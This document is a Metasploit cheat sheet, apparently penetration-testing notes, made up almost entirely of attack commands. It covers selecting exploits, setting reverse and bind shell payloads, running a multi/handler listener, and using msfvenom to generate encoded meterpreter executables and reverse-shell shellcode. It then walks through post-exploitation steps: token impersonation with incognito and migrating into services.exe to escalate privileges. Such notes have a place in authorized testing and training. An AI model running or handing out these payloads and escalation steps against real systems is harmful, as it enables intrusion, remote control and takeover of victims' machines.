metasploit

~~~bash
msfconsole
msfvenom
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
~~~

Launch MSFConsole

~~~bash
msfconsole
~~~

Pick an Exploit (Way into the system)

~~~bash
use exploit/.../.../.../explot_to_use
~~~

Set a Payload (Way back to you)

~~~bash
set PAYLOAD .../.../.../reverse_shell
set PAYLOAD .../.../.../bind_shell
~~~

Show Options to Set

~~~bash
show options
~~~

Set Options within the Exploit and Payload

~~~bash
set LHOST 10.10.10.100
set LPORT 4444
set RHOSTS 10.10.10.10
set RPORT 8080
etc...
~~~

Spool output to file

~~~bash
spool /home/kali/spool_file.txt
~~~

Stopping Spooling

~~~bash
spool off
~~~

Run Exploit

~~~bash
run
~~~

Accepting Connections Within Metasploit

~~~bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
~~~

Breakdown of the above:

use exploit/multi/handler                                        -- Sets up the handler to accept the incoming connection
set PAYLOAD windows/meterpreter/reverse_tcp           -- Sets the payload for the handler to accept and interpret properly (THIS MUST MATCH THE MSFVENOM GENERATED PAYLOAD)
set LHOST your-ip                                                  -- Sets the Local Host IP/Listening Host IP for accepting the incoming connection
set LPORT listening-port                                          -- Sets the Local Port on the Local/Listening Host to Listen on for the incoming connection
run                                                                      -- Runs the Handler that we have set up

Example of the MSFVenom command used to set this attack up:

~~~bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
~~~

Once you have a meterpreter shell, you can type “help” for a list of commands available to you in the Meterpreter session. If you do not have needed commands, you may be running mismatched meterpreter payloads and meterpreter can't get a proper session set up.

Once you have a Meterpreter session active, you can load and use modules on the Victim PC.

To load a module, issue the command:

~~~bash
load <module name>
~~~

ex. load incognito

Incognito is used for Token Impersonation

~~~bash
Meterpreter>load incognito
~~~

List Available Tokens for Impersonation

List groups

~~~bash
list_tokens -g
~~~

list users

~~~bash
list_tokens -u
~~~

Impersonate a Specific Available Token

~~~bash
impersonate_token "BUILTIN\Administrators"
~~~

Verify that you have Successfully Impersonated the Token

~~~bash
getuid
~~~

Find a safe Process to Migrate to for Primary Token (Impersonation is a stepping stone for Primary Token Impersonation)

~~~bash
ps
~~~

Locate the PID for “services.exe” as this is generally a safe process to migrate to for escalation

~~~bash
migrate <PID Number>
~~~

After Successfully Migrating to another process with Higher Privs, you can now execute an interactive shell on the system

~~~bash
shell
~~~

Allows you to generate shellcode or executables for access on a victim machine

Shellcode Generation 

***(This will work without Metasploit as this is a non-meterpreter payload)

~~~bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT EXITFUNC=thread -f c -a x86 -b "\x00\OTHERBADCHARS"
~~~

Breakdown of the above command:
-p == Payload Specification
windows/shell_reverse_tcp == Payload To Use
LHOST == Local Host IP (Attacker PC)
LPORT == Listener Port (Attacker PC)
EXITFUNC == Function To Exit Payload Gracefully
-f == Format/File Type
c == C Code (exe would indicate windows binary, py would indicate python script, etc.)
-a == Architecture Specification
x86 == 32Bit Architecture
-b == Bad Character Specification (used for Buffer Overflow Shellcode)
“\x00\OTHERBADCHARS” == Bad Character Definitions

Executable Generation 

***(This will not work outside of Metasploit as this is a meterpreter payload)

~~~bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=4444 -f exe -o badexecutable.exe
~~~

Breakdown of the above command:
-p == Payload Specification
windows/shell_reverse_tcp == Payload To Use
-a == Architecture Specification
x86 == 32Bit Architecture
--encoder == Encoder Specification flag
x86/sikata_ga_nai == Encoder Definition
LHOST == Local Host IP (Attacker PC)
LPORT == Listener Port (Attacker PC)
-f == Format/File Type
exe == exe binary (exe would indicate windows binary, py would indicate python script, etc.)
-o == Output File Specification Flag
badexecutable.exe == Output File Definition (Path can be included i.e. /home/user/badexecutable.exe)

!IMPORTANT NOTES!

Meterpreter Payloads will only be accepted in Metasploit
Other Payloads should be able to be accepted using NetCat

~~~bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.152 LPORT=4444 -f elf -o shell
~~~
